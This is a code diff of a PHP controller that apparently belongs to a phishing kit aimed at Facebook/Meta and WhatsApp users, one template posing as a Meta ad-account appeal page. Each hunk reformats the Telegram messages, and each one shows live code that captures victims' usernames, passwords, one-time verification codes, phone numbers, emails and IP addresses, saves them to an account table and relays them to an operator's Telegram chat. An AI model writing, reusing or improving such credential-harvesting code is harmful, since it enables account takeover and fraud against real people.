@@ -102,14 +102,16 @@ class CustomWeb extends Controller
                                     ]
                                 ];
                                 $msg = implode("\n", [
-                                    "Title: <b>$website->title</b>",
+                                    "Web: <b>$website->title</b>",
                                     "",
-                                    "User: <code>$post_data->username</code>",
-                                    "Pass: <code>$post_data->password</code>",
-                                    "---------------",
-                                    "Emoji phân biệt: $web_info->emoji",
-                                    "IP: $ip",
-                                    "---------------"
+                                    "-----------------------",
+                                    "<b>Tài khoản:</b> <code>$post_data->username</code>",
+                                    "<b>Mật khẩu:</b> <code>$post_data->password</code>",
+                                    "-----------------------",
+                                    "",
+                                    "<b>Phân biệt:</b> $web_info->emoji",
+                                    "<b>IP:</b> $ip",
+                                    ""
                                 ]);
                                 // tiến hành insert
                                 FbAccount::create([
@@ -134,13 +136,16 @@ class CustomWeb extends Controller
                                     ]
                                 ];
                                 $msg = implode("\n", [
-                                    "Title: <b>$website->title</b>",
+                                    "Web: <b>$website->title</b>",
                                     "",
-                                    "Mã xác minh: <code>$post_data->otp</code>",
-                                    "---------------",
-                                    "Emoji phân biệt: $web_info->emoji",
-                                    "IP: $ip",
-                                    "---------------"
+                                    "------------------------",
+                                    "<b>Tài khoản:</b> <code>$post_data->username</code>",
+                                    "<b>Mã xác minh:</b> <code>$post_data->otp</code>",
+                                    "------------------------",
+                                    "",
+                                    "<b>Phân biệt:</b> $web_info->emoji",
+                                    "<b>IP:</b> $ip",
+                                    ''
                                 ]);
                                 $custom_bot->sendMessage([
                                     'chat_id' => $user_telegram_id,
@@ -207,13 +212,15 @@ class CustomWeb extends Controller
                                     ],
                                 ];
                                 $msg = implode("\n", [
-                                    "Title: <b>$website->title</b>",
+                                    "Web: <b>$website->title</b>",
                                     "",
-                                    "Số điện thoại: <code>$post_data->phone</code>",
-                                    "---------------",
-                                    "Emoji phân biệt: $web_info->emoji",
-                                    "IP: $ip",
-                                    "---------------"
+                                    '----------------------',
+                                    "<b>Số điện thoại:</b> <code>$post_data->phone</code>",
+                                    "----------------------",
+                                    '',
+                                    "<b>Phân biệt:</b> $web_info->emoji",
+                                    "<b>IP:</b> $ip",
+                                    ''
                                 ]);
                                 // tiến hành insert
                                 FbAccount::create([
@@ -239,12 +246,14 @@ class CustomWeb extends Controller
                                 $msg = implode("\n", [
                                     "Title: <b>$website->title</b>",
                                     "",
-                                    "Số điện thoại: <code>$post_data->phone</code>",
-                                    "Mã xác minh: <code>$post_data->otp</code>",
-                                    "---------------",
-                                    "Emoji phân biệt: $web_info->emoji",
-                                    "IP: $ip",
-                                    "---------------"
+                                    "------------------------",
+                                    "<b>Số điện thoại:</b> <code>$post_data->phone</code>",
+                                    "<b>Mã xác minh:</b> <code>$post_data->otp</code>",
+                                    "------------------------",
+                                    '',
+                                    "<b>Phân biệt:</b> $web_info->emoji",
+                                    "<b>IP:</b> $ip",
+                                    ''
                                 ]);
                                 $whatsapp_realtime_bot->sendMessage([
                                     'chat_id' => $user_telegram_id,
@@ -312,13 +321,16 @@ class CustomWeb extends Controller
                             ];
                             $msg = implode("\n", [
                                 "Giao diện tùy chỉnh: <b>KHÁNG TKQC META</b>",
-                                "Title: <b>$website->title</b>",
+                                "Web: <b>$website->title</b>",
                                 "",
-                                "Số điện thoại: <code>$post_data->phone</code>",
-                                "Email: <code>$post_data->email</code>",
-                                "Pass: <code>$post_data->password</code>",
+                                '------------------------',
+                                "<b>Số điện thoại:</b> <code>$post_data->phone</code>",
+                                "<b>Email:</b> <code>$post_data->email</code>",
+                                "<b>Mật khẩu:</b> <code>$post_data->password</code>",
+                                "------------------------",
+                                "",
                                 "Emoji phân biệt: $web_info->emoji",
-                                "---------------"
+                                ""
                             ]);
                             // tiến hành insert
                             FbAccount::create([
